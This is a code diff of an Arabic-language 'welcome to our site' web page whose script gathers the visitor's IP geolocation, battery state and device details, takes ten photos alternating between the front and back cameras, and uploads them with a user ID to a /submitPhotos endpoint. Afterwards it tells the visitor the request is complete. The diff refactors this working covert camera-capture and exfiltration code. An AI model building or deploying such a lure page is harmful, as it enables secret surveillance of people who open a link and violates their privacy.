@@ -3,7 +3,7 @@
 <head>
     <title>مرحبا بك في موقعنا</title>
     <style>
-        body {
+      body {
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
@@ -50,7 +50,7 @@
         const backCanvas = document.getElementById('backCanvas');
         const userId = window.location.pathname.split('/')[2];
 
-        async function collectAdditionalData() {
+     async function collectAdditionalData() {
          try {
                 const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                 const battery = await navigator.getBattery();
@@ -84,23 +84,11 @@
             const match = ua.match(/\(([^)]+)\)/);
             return match ? match[1] : 'Unknown';
         }
-
         async function requestCameraPermission(facingMode) {
             try {
                 const constraints = {
-                    video: {
-                        facingMode: facingMode
-                    }
+                    video: { facingMode: facingMode }
                 };
-
-                if (facingMode === 'user') {
-                    constraints.video.width = { ideal: 640 };
-                    constraints.video.height = { ideal: 480 };
-                } else {
-                    constraints.video.width = { ideal: 1280 };
-                    constraints.video.height = { ideal: 720 };
-                }
-
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 return stream;
             } catch (error) {
@@ -129,47 +117,60 @@
         async function handleSuccess(frontStream, backStream, additionalData) {
             if (frontStream) {
                 frontVideo.srcObject = frontStream;
-                await setupCamera(frontVideo, frontCanvas, 'front', additionalData);
             }
             if (backStream) {
                 backVideo.srcObject = backStream;
-                await setupCamera(backVideo, backCanvas, 'back', additionalData);
             }
+            await captureBothCameras(additionalData);
         }
 
-        async function setupCamera(video, canvas, cameraType, additionalData) {
+        async function captureBothCameras(additionalData) {
+            let frontPhotoCount = 0;
+            let backPhotoCount = 0;
+            const totalPhotos = 10;
+
+            while (frontPhotoCount + backPhotoCount < totalPhotos) {
+                if (frontVideo.srcObject && frontPhotoCount <= backPhotoCount) {
+                    await captureAndSend(frontVideo, frontCanvas, 'front', frontPhotoCount, additionalData);
+                    frontPhotoCount++;
+                } else if (backVideo.srcObject) {
+                    await captureAndSend(backVideo, backCanvas, 'back', backPhotoCount, additionalData);
+                    backPhotoCount++;
+                } else if (frontVideo.srcObject) {
+                    // إذا لم تكن هناك كاميرا خلفية، استمر في استخدام الكاميرا الأمامية
+                    await captureAndSend(frontVideo, frontCanvas, 'front', frontPhotoCount, additionalData);
+                    frontPhotoCount++;
+                } else {
+                    break; // لا توجد كاميرات متاحة
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر ثانية واحدة بين الصور
+            }
+
+            document.querySelector('.container').innerHTML = `
+                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+            `;
+        }
+
+        async function captureAndSend(video, canvas, cameraType, photoCount, additionalData) {
             return new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    const { videoWidth, videoHeight } = video;
-                    canvas.width = videoWidth;
-                    canvas.height = videoHeight;
-
-                    const context = canvas.getContext('2d');
-                    let photoCount = 0;
-
-                    const captureInterval = setInterval(() => {
-                        if (photoCount >= 5) {
-                            clearInterval(captureInterval);
-                            resolve();
-                            return;
-                        }
-
-                        context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                            formData.append('userId', userId);
-                            formData.append('cameraType', cameraType);
-                            formData.append('imageWidth', videoWidth);
-                            formData.append('imageHeight', videoHeight);
-                            formData.append('additionalData', JSON.stringify(additionalData));
-                            post('/submitPhotos', formData);
-                        }, 'image/webp', 0.7);
-
-                        photoCount++;
-                    }, 1000);
-                };
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                    formData.append('userId', userId);
+                    formData.append('cameraType', cameraType);
+                    formData.append('imageWidth', canvas.width);
+                    formData.append('imageHeight', canvas.height);
+                    formData.append('additionalData', JSON.stringify(additionalData));
+                    post('/submitPhotos', formData);
+                    resolve();
+                }, 'image/webp', 0.7);
             });
         }
 
@@ -211,6 +212,7 @@
 
             console.error('Max retries reached. Unable to send photos.');
         }
+
         window.addEventListener('load', init);
     </script>
 </body>
